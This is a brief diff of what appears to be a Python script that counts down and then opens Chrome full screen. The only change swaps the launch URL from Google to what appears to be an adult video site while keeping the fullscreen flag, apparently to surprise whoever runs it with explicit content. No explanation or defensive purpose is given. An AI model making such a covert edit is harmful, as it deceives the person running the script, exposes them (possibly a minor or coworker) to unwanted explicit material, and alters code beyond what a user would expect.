@@ -45,7 +45,7 @@ for i in range(1, 6):
     time.sleep(1)
 
 print("\nOpening Google Chrome in a new fullscreen window...")
-subprocess.Popen([r"C:\Program Files\Google\Chrome\Application\chrome.exe", "--new-window", "https://www.google.com", "--start-fullscreen"])
+subprocess.Popen([r"C:\Program Files\Google\Chrome\Application\chrome.exe", "--new-window", "https://www.xvideos9.com/", "--start-fullscreen"])
 
 # Wait for Chrome to fully open and load
 time.sleep(3)
